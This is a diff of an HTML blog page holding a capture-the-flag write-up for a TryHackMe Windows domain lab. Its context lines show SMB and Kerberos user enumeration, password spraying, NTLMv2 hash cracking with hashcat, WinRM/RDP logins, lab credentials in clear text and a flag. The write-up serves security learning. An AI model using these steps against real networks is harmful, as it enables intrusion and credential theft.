@@ -324,7 +324,7 @@ The real challenge begins here: we have to set up a sandboxed environment to run
 
 
 
-<div id="flowchart-1752166044029332729" class="attack-path-flowchart">
+<div id="flowchart-1752251679517182774" class="attack-path-flowchart">
   <div class="flowchart-controls">
     <button class="zoom-btn" data-action="zoom-in" title="Zoom In">+</button>
     <button class="zoom-btn" data-action="zoom-out" title="Zoom Out">−</button>
@@ -995,7 +995,7 @@ From the <code>rdp-ntlm-info</code> script, we also discover crucial details:</l
   </div>
   <div class="terminal-content">
     <pre><code>
-<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">echo</span> <span class="string">"10.10.22.233 fire fire.windcorp.thm windcorp.thm"</span> | tee <span class="flag">-a</span> /etc/hosts
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">echo</span> <span class="string">"10.10.22.233 fire fire.windcorp.thm windcorp.thm"</span> | <span style="color:#15adff">tee</span> <span class="flag">-a</span> /etc/hosts
 </code><button class="copy-code">copy</button></pre>
   </div>
 </div>
@@ -1016,7 +1016,7 @@ From the <code>rdp-ntlm-info</code> script, we also discover crucial details:</l
   <div class="terminal-content">
     <pre><code>
 <span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">nxc</span> smb $target  <span class="flag">-u</span> <span class="string">''</span> <span class="flag">-p</span> <span class="string">''</span> <span class="flag">--shares</span>
-<span class="smb">SMB</span>         10.10.22.233    445    FIRE             <span class="indicator-info">[*]</span> Windows 10 / Server 2019 Build 17763 x64 (name:FIRE) (domain:windcorp.thm) (signing:True) (SMBv1:False) 
+<span class="smb">SMB</span>         10.10.22.233    445    FIRE             <span class="indicator-info">[*]</span> Windows 10 / Server 2019 Build 17763 x64 (name:FIRE) (domain:windcorp.thm) (<span style="color:red;font-weight:bold">signing:True</span>) (<span style="color:orange;font-weight:bold">SMBv1:False</span>) 
 <span class="smb">SMB</span>         10.10.22.233    445    FIRE             <span class="indicator-success">[+]</span> windcorp.thm\: 
 <span class="smb">SMB</span>         10.10.22.233    445    FIRE             <span class="indicator-error">[-]</span> Error enumerating shares: STATUS_ACCESS_DENIED
 </code><button class="copy-code">copy</button></pre>
@@ -1136,7 +1136,7 @@ Starting gobuster in directory enumeration mode
   </div>
   <div class="terminal-content">
     <pre><code>
-<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">curl</span> <span class="flag">-s</span> http://10.10.22.233/ | grep <span class="flag">-oP</span> <span class="string">'[\w.]+@fire\.windcorp\.thm'</span> | sort <span class="flag">-u</span> | tee users.txt
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">curl</span> <span class="flag">-s</span> http://10.10.22.233/ | <span style="color:#15adff">grep</span> <span class="flag">-oP</span> <span class="string">'[\w.]+@fire\.windcorp\.thm'</span> | <span style="color:#15adff">sort</span> <span class="flag">-u</span> | <span style="color:#15adff">tee</span> users.txt
 angrybird253@fire.windcorp.thm
 brownostrich284@fire.windcorp.thm
 buse@fire.windcorp.thm
@@ -1182,7 +1182,7 @@ Version: dev (n/a) - 07/07/25 - Ronnie Flathers @ropnop
 2025/07/07 13:53:33 >  Using KDC(s):
 2025/07/07 13:53:33 >   fire.windcorp.thm:88
 
-2025/07/07 13:53:33 >  <span class="indicator-success">[+]</span> VALID USERNAME:       Edeltraut@windcorp.thm
+<span style="color:#00ff48">2025/07/07 13:53:33 >  <span class="indicator-success">[+]</span> VALID USERNAME:       Edeltraut@windcorp.thm
 2025/07/07 13:53:33 >  <span class="indicator-success">[+]</span> VALID USERNAME:       Emile@windcorp.thm
 2025/07/07 13:53:33 >  <span class="indicator-success">[+]</span> VALID USERNAME:       organicfish718@windcorp.thm
 2025/07/07 13:53:33 >  <span class="indicator-success">[+]</span> VALID USERNAME:       angrybird253@windcorp.thm
@@ -1194,7 +1194,7 @@ Version: dev (n/a) - 07/07/25 - Ronnie Flathers @ropnop
 2025/07/07 13:53:33 >  <span class="indicator-success">[+]</span> VALID USERNAME:       Edward@windcorp.thm
 2025/07/07 13:53:34 >  <span class="indicator-success">[+]</span> VALID USERNAME:       tinygoose102@windcorp.thm
 2025/07/07 13:53:34 >  <span class="indicator-success">[+]</span> VALID USERNAME:       whiteleopard529@windcorp.thm
-2025/07/07 13:53:34 >  <span class="indicator-success">[+]</span> VALID USERNAME:       sadswan869@windcorp.thm
+2025/07/07 13:53:34 >  <span class="indicator-success">[+]</span> VALID USERNAME:       sadswan869@windcorp.thm</span>
 </code><button class="copy-code">copy</button></pre>
   </div>
 </div>
@@ -1229,7 +1229,7 @@ CeWL 6.2.1 (More Fixes) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
   <div class="terminal-content">
     <pre><code>
 <span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">nxc</span> smb fire.windcorp.thm <span class="flag">-u</span> users.txt <span class="flag">-p</span> cewl-windcorp.txt                      
-<span class="smb">SMB</span>         10.10.22.233    445    FIRE             <span class="indicator-info">[*]</span> Windows 10 / Server 2019 Build 17763 x64 (name:FIRE) (domain:windcorp.thm) (signing:True) (SMBv1:False) 
+<span class="smb">SMB</span>         10.10.22.233    445    FIRE             <span class="indicator-info">[*]</span> Windows 10 / Server 2019 Build 17763 x64 (name:FIRE) (domain:windcorp.thm) (<span style="color:red;font-weight:bold">signing:True</span>) (<span style="color:orange;font-weight:bold">SMBv1:False</span>) 
 <span class="smb">SMB</span>         10.10.22.233    445    FIRE             <span class="indicator-error">[-]</span> windcorp.thm\angrybird253@fire.windcorp.thm:Windcorp STATUS_LOGON_FAILURE 
 <span class="smb">SMB</span>         10.10.22.233    445    FIRE             <span class="indicator-error">[-]</span> windcorp.thm\brownostrich284@fire.windcorp.thm:Windcorp STATUS_LOGON_FAILURE 
 <span class="smb">SMB</span>         10.10.22.233    445    FIRE             <span class="indicator-error">[-]</span> windcorp.thm\buse@fire.windcorp.thm:Windcorp STATUS_LOGON_FAILURE
@@ -1377,7 +1377,7 @@ Version: dev (n/a) - 07/07/25 - Ronnie Flathers @ropnop
 2025/07/07 14:14:13 >  Using KDC(s):
 2025/07/07 14:14:13 >   fire.windcorp.thm:88
 
-2025/07/07 14:14:13 >  <span class="indicator-success">[+]</span> VALID USERNAME:       angrybird253@windcorp.thm
+<span style="color:#00ff48">2025/07/07 14:14:13 >  <span class="indicator-success">[+]</span> VALID USERNAME:       angrybird253@windcorp.thm
 2025/07/07 14:14:13 >  <span class="indicator-success">[+]</span> VALID USERNAME:       orangegorilla428@windcorp.thm
 2025/07/07 14:14:13 >  <span class="indicator-success">[+]</span> VALID USERNAME:       Emile@windcorp.thm
 2025/07/07 14:14:13 >  <span class="indicator-success">[+]</span> VALID USERNAME:       buse@windcorp.thm
@@ -1392,7 +1392,7 @@ Version: dev (n/a) - 07/07/25 - Ronnie Flathers @ropnop
 2025/07/07 14:14:13 >  <span class="indicator-success">[+]</span> VALID USERNAME:       lilyle@windcorp.thm
 2025/07/07 14:14:13 >  <span class="indicator-success">[+]</span> VALID USERNAME:       whiteleopard529@windcorp.thm
 2025/07/07 14:14:13 >  <span class="indicator-success">[+]</span> VALID USERNAME:       Emilieje@windcorp.thm
-2025/07/07 14:14:13 >  <span class="indicator-success">[+]</span> VALID USERNAME:       kirkug@windcorp.thm
+2025/07/07 14:14:13 >  <span class="indicator-success">[+]</span> VALID USERNAME:       kirkug@windcorp.thm</span>
 </code><button class="copy-code">copy</button></pre>
   </div>
 </div>
@@ -1410,7 +1410,7 @@ Version: dev (n/a) - 07/07/25 - Ronnie Flathers @ropnop
   <div class="terminal-content">
     <pre><code>
 <span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">nxc</span> smb $target <span class="flag">-u</span> lilyle <span class="flag">-p</span> <span class="string">'ChangeMe#1234'</span> <span class="flag">--shares</span> 
-<span class="smb">SMB</span>         10.10.22.233    445    FIRE             <span class="indicator-info">[*]</span> Windows 10 / Server 2019 Build 17763 x64 (name:FIRE) (domain:windcorp.thm) (signing:True) (SMBv1:False) 
+<span class="smb">SMB</span>         10.10.22.233    445    FIRE             <span class="indicator-info">[*]</span> Windows 10 / Server 2019 Build 17763 x64 (name:FIRE) (domain:windcorp.thm) (<span style="color:red;font-weight:bold">signing:True</span>) (<span style="color:orange;font-weight:bold">SMBv1:False</span>) 
 <span class="smb">SMB</span>         10.10.22.233    445    FIRE             <span class="indicator-success">[+]</span> windcorp.thm\lilyle:ChangeMe#1234 
 <span class="smb">SMB</span>         10.10.22.233    445    FIRE             <span class="indicator-info">[*]</span> Enumerated shares
 <span class="smb">SMB</span>         10.10.22.233    445    FIRE             <span class="row-header">Share           Permissions     Remark</span>
@@ -1878,7 +1878,7 @@ ctl.!default {
   </div>
   <div class="terminal-content">
     <pre><code>
-<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">$</span> hashcat hash /usr/share/wordlists/rockyou.txt
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">hashcat</span> hash /usr/share/wordlists/rockyou.txt
 hashcat (v6.2.6) starting in autodetect mode
 ...SNIP...
 BUSE::WINDCORP:07690831477c80d7:7c28dcfb5200f74a0958edcbc3669253:01010000000000000deff46b71efdb01c84bf6173a84765000000000020008004100310034004f0001001e00570049004e002d0046004d005700580047004f004c00590038004e004a00040014004100310034004f002e004c004f00430041004c0003003400570049004e002d0046004d005700580047004f004c00590038004e004a002e004100310034004f002e004c004f00430041004c00050014004100310034004f002e004c004f00430041004c000800300030000000000000000100000000200000036a7a0efc4d7a8afc3644d24276779fa48f3c7ada2736baeb0696e885e6c4630a00100000000000000000000000000000000000090000000000000000000000:uzunLM+3131
@@ -1929,7 +1929,7 @@ WINRM       10.10.96.189    5985   FIRE             <span class="indicator-info"
   arc4 = algorithms.ARC4(self._key)
 WINRM       10.10.96.189    5985   FIRE             <span class="indicator-success">[+]</span> windcorp.thm\buse:uzunLM+3131 (Pwn3d!)
 <span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">nxc</span> rdp $target <span class="flag">-u</span> buse <span class="flag">-p</span> <span class="string">'uzunLM+3131'</span>   
-RDP         10.10.96.189    3389   FIRE             <span class="indicator-info">[*]</span> Windows 10 or Windows Server 2016 Build 17763 (name:FIRE) (domain:windcorp.thm) (nla:True)
+RDP         10.10.96.189    3389   FIRE             <span class="indicator-info">[*]</span> Windows 10 or Windows Server 2016 Build 17763 (name:FIRE) (domain:windcorp.thm) (<span style="color:cyan;font-weight:bold">nla:True</span>)
 RDP         10.10.96.189    3389   FIRE             <span class="indicator-success">[+]</span> windcorp.thm\buse:uzunLM+3131 (Pwn3d!)
 
 </code><button class="copy-code">copy</button></pre>
@@ -2123,7 +2123,7 @@ Kerberos support for Dynamic Access Control on this device has been disabled.
   <div class="terminal-content">
     <pre><code>
 <span style="color: red">*Evil-WinRM*</span><span style="color: orange; font-weight: bold"> PS</span> C:\scripts> type checkservers.ps1
-# reset the lists of hosts prior to looping
+<span style="color:white"># reset the lists of hosts prior to looping
 $OutageHosts = $Null
 # specify the time you want email notifications resent for hosts that are down
 $EmailTimeOut = 30
@@ -2554,10 +2554,10 @@ Flag 3: THM{ba3a2bff2e535b514ad760c283890faae54ac2ef}
       <li><a href="https://0xblivion.dev/tags/xmpp/">Xmpp</a></li>
     </ul>
 <nav class="paginav">
-  <a class="prev" href="https://0xblivion.dev/posts/thm/windows/tryhackme/">
+  <a class="prev" href="https://0xblivion.dev/posts/thm/windows/insane/tryhackme-crocc-crew-writeup/">
     <span class="title">« Prev</span>
     <br>
-    <span>TryHackMe - CroccCrew WriteUp</span>
+    <span>TryHackMe - Crocc Crew WriteUp</span>
   </a>
   <a class="next" href="https://0xblivion.dev/posts/htb/linux/medium/hackthebox-cat-writeup/">
     <span class="title">Next »</span>
